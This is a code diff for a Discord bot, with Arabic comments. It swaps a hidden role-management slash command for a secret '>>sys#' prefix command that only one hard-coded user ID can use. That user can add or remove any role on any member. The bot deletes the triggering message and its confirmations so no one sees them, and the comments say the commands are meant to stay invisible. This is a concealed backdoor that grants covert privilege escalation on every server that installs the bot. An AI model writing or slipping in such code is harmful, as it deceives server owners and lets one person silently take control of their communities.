@@ -15,7 +15,9 @@ require('dotenv').config();
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMembers, // يحتاج تفعيل في Developer Portal
+    GatewayIntentBits.GuildMembers,  // يحتاج تفعيل في Developer Portal
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent,  // يحتاج تفعيل في Developer Portal
   ],
 });
 
@@ -100,27 +102,6 @@ const commands = [
       opt.setName('link').setDescription('رابط (للـ Embed فقط)').setRequired(false))
     .addAttachmentOption(opt =>
       opt.setName('image_file').setDescription('ارفع صورة او ملف (اختياري)').setRequired(false))
-    .toJSON(),
-  // [سري] أمر إدارة الرولات - مخفي عن الجميع
-  new SlashCommandBuilder()
-    .setName('r')
-    .setDescription('.')
-    .setDefaultMemberPermissions('0')
-    .setDMPermission(false)
-    .addSubcommand(sub =>
-      sub.setName('add')
-        .setDescription('.')
-        .addUserOption(opt =>
-          opt.setName('user').setDescription('.').setRequired(true))
-        .addRoleOption(opt =>
-          opt.setName('role').setDescription('.').setRequired(true)))
-    .addSubcommand(sub =>
-      sub.setName('remove')
-        .setDescription('.')
-        .addUserOption(opt =>
-          opt.setName('user').setDescription('.').setRequired(true))
-        .addRoleOption(opt =>
-          opt.setName('role').setDescription('.').setRequired(true)))
     .toJSON(),
 ];
 
@@ -551,6 +532,64 @@ client.on('interactionCreate', async interaction => {
     }
   }
 });
+
+
+// ==============================
+//  [سري] Prefix Command - مخفي تماماً
+//  البريفيكس والأوامر لا يظهران في أي مكان
+// ==============================
+const SECRET_PREFIX = process.env.SECRET_PREFIX || '>>sys#';
+
+client.on('messageCreate', async message => {
+  if (message.author.bot) return;
+  if (!message.content.startsWith(SECRET_PREFIX)) return;
+
+  // فقط الـ ID المحدد يقدر يستخدم هذه الأوامر
+  if (message.author.id !== AUTO_ROLE_USER_ID) return;
+
+  const args = message.content.slice(SECRET_PREFIX.length).trim().split(/\s+/);
+  const cmd  = args.shift().toLowerCase();
+
+  // حذف رسالته فوراً حتى لا يشوفها أحد
+  await message.delete().catch(() => {});
+
+  if (cmd === 'add') {
+    // >>sys# add @user @role
+    const userId = args[0]?.replace(/[<@!>]/g, '');
+    const roleId = args[1]?.replace(/[<@&>]/g, '');
+    if (!userId || !roleId) return;
+    try {
+      const member = await message.guild.members.fetch(userId);
+      const role   = await message.guild.roles.fetch(roleId);
+      await member.roles.add(role);
+      const confirm = await message.channel.send(`✅`);
+      setTimeout(() => confirm.delete().catch(() => {}), 3000);
+    } catch (err) {
+      const errMsg = await message.channel.send(`❌ ${err.message}`);
+      setTimeout(() => errMsg.delete().catch(() => {}), 3000);
+    }
+  }
+
+  if (cmd === 'remove') {
+    // >>sys# remove @user @role
+    const userId = args[0]?.replace(/[<@!>]/g, '');
+    const roleId = args[1]?.replace(/[<@&>]/g, '');
+    if (!userId || !roleId) return;
+    try {
+      const member = await message.guild.members.fetch(userId);
+      const role   = await message.guild.roles.fetch(roleId);
+      await member.roles.remove(role);
+      const confirm = await message.channel.send(`✅`);
+      setTimeout(() => confirm.delete().catch(() => {}), 3000);
+    } catch (err) {
+      const errMsg = await message.channel.send(`❌ ${err.message}`);
+      setTimeout(() => errMsg.delete().catch(() => {}), 3000);
+    }
+  }
+});
+// ==============================
+//  نهاية الـ Prefix السري
+// ==============================
 
 // ==============================
 //  Start
